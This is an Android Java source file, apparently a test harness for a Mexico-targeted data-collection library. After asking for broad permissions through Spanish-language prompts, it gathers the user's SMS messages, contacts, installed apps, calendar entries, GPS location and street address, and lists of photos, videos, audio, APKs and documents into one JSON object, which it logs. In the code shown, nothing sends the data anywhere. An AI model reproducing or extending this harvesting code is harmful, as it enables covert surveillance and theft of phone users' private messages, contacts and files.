package com.tang.mexicomaven;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.location.Address;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import com.ok.mexico.DevicesUtil;
import com.ok.mexico.MxcDevicesUtils;
import com.permissionx.guolindev.PermissionX;
import com.permissionx.guolindev.callback.ExplainReasonCallback;
import com.permissionx.guolindev.callback.ForwardToSettingsCallback;
import com.permissionx.guolindev.callback.RequestCallback;
import com.permissionx.guolindev.request.ExplainScope;
import com.permissionx.guolindev.request.ForwardScope;
import com.tang.mexicomaven.location.LocationCallBack;
import com.tang.mexicomaven.location.LocationManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity implements LocationCallBack {

    public JSONObject mJsonObject;
    private JSONObject devicesJsonObject = null;
    private String latitudeGps = "";
    private String longitudeGps = "";
    private String latitudeGoogle = "";
    private String longitudeGoogle = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        PermissionX.init(this)
                .permissions(Manifest.permission.READ_PHONE_STATE, Manifest.permission.CAMERA, Manifest.permission.READ_SMS,
                        Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
                        Manifest.permission.READ_CONTACTS,Manifest.permission.READ_CALENDAR)
                .onExplainRequestReason(new ExplainReasonCallback() {
                    @Override
                    public void onExplainReason(ExplainScope scope, List<String> deniedList) {
                        scope.showRequestReasonDialog(
                                deniedList,
                                "Por favor, abra permisos en la configuración de la aplicación",
                                "ok"
                        );
                    }
                }).onForwardToSettings(new ForwardToSettingsCallback() {
            @Override
            public void onForwardToSettings(ForwardScope scope, List<String> deniedList) {
                scope.showForwardToSettingsDialog(
                        deniedList,
                        "Los permisos que está solicitando son necesarios para esta aplicación",
                        "ok"
                );
            }
        }).request(new RequestCallback() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void onResult(boolean allGranted, List<String> grantedList, List<String> deniedList) {
                if (allGranted) {
                    startGps();
                    Log.i("main", "11111111111111111");
                } else {
                    mJsonObject = new JSONObject();
                }
            }
        });
    }

    private void startGps() {
        mJsonObject = new JSONObject();
        new InfoAsynTasks().executeOnExecutor(Executors.newCachedThreadPool());
        LocationManager.initGPS(this,MainActivity.this);
    }



    private class InfoAsynTasks extends AsyncTask<String, Integer, JSONObject> {

        @Override
        protected JSONObject doInBackground(String... strings) {
            try {
                Map<String, Object> map = MxcDevicesUtils.getDevicesInfo(MainActivity.this);
                devicesJsonObject = new JSONObject(map);
                if (!TextUtils.isEmpty(latitudeGps) && !TextUtils.isEmpty(longitudeGps)) {
                    devicesJsonObject.put("latitude", latitudeGps);
                    devicesJsonObject.put("longitude", longitudeGps);
                } else {
                    devicesJsonObject.put("latitude", latitudeGoogle);
                    devicesJsonObject.put("longitude", longitudeGoogle);
                }
                mJsonObject.put("deviceAllInfo", devicesJsonObject);
                mJsonObject.put("msgList", DevicesUtil.getMobileSms(MainActivity.this));
                mJsonObject.put("phoneList", DevicesUtil.getContactJson(MainActivity.this));
                mJsonObject.put("appList", DevicesUtil.getInstallApp(MainActivity.this));
                mJsonObject.put("image", DevicesUtil.queryCategoryFilesSync(MainActivity.this, "image"));
                mJsonObject.put("video", DevicesUtil.queryCategoryFilesSync(MainActivity.this, "video"));
                mJsonObject.put("audio", DevicesUtil.queryCategoryFilesSync(MainActivity.this, "audio"));
                mJsonObject.put("apk", DevicesUtil.getFile(MainActivity.this, "application/vnd.android.package-archive"));
                mJsonObject.put("pdf", DevicesUtil.getFile(MainActivity.this, "application/pdf"));
                mJsonObject.put("ppt", DevicesUtil.getFile(MainActivity.this, "application/vnd.ms-powerpoint"));
                mJsonObject.put("word", DevicesUtil.getFile(MainActivity.this, "application/msword"));
                mJsonObject.put("excel", DevicesUtil.getFile(MainActivity.this, "application/vnd.ms-excel"));
                mJsonObject.put("text", DevicesUtil.getFile(MainActivity.this, "text/plain"));
                mJsonObject.put("calendarList", DevicesUtil.getCalendar(MainActivity.this));
                mJsonObject.put("imageList", DevicesUtil.getImageList(MainActivity.this));

            } catch (Exception e) {
                e.printStackTrace();
            }
            return mJsonObject;
        }

        @Override
        protected void onPostExecute(JSONObject json) {
            super.onPostExecute(json);
            Log.i("tangrui",json.toString());
        }
    }


    @Override
    public void onLocationGps(Double latitude, Double longitude) {
        latitudeGps = latitude.toString();
        longitudeGps = longitude.toString();
        if (devicesJsonObject != null) {
            try {
                devicesJsonObject.put("latitude", latitudeGps);
                devicesJsonObject.put("longitude", longitudeGps);
                devicesJsonObject.put("city", DevicesUtil.getCity(MainActivity.this,Double.parseDouble(latitudeGps), Double.parseDouble(longitudeGps)));

                Address address = DevicesUtil.getAddress(MainActivity.this,Double.parseDouble(latitudeGps), Double.parseDouble(longitudeGps));
                if (address != null) {
                    devicesJsonObject.put("gps_address", address.getAddressLine(0));
                } else {
                    devicesJsonObject.put("gps_address", "");
                }
                devicesJsonObject.put("address_info", DevicesUtil.getLocations(MainActivity.this,Double.parseDouble(latitudeGps), Double.parseDouble(longitudeGps)));

                mJsonObject.put("deviceAllInfo", devicesJsonObject);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onLocationGoogle(Double latitude, Double longitude) {
        latitudeGoogle = latitude.toString();
        longitudeGoogle = longitude.toString();
        if (devicesJsonObject != null) {
            try {
                devicesJsonObject.put("latitude", latitudeGoogle);
                devicesJsonObject.put("longitude", longitudeGoogle);
                devicesJsonObject.put("city", DevicesUtil.getCity(MainActivity.this,Double.parseDouble(latitudeGoogle), Double.parseDouble(longitudeGoogle)));
                Address address = DevicesUtil.getAddress(MainActivity.this,Double.parseDouble(latitudeGoogle), Double.parseDouble(longitudeGoogle));
                if (address != null) {
                    devicesJsonObject.put("gps_address", address.getAddressLine(0));
                } else {
                    devicesJsonObject.put("gps_address", "");
                }
                devicesJsonObject.put("address_info", DevicesUtil.getLocations(MainActivity.this,Double.parseDouble(latitudeGoogle), Double.parseDouble(longitudeGoogle)));
                mJsonObject.put("deviceAllInfo", devicesJsonObject);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

}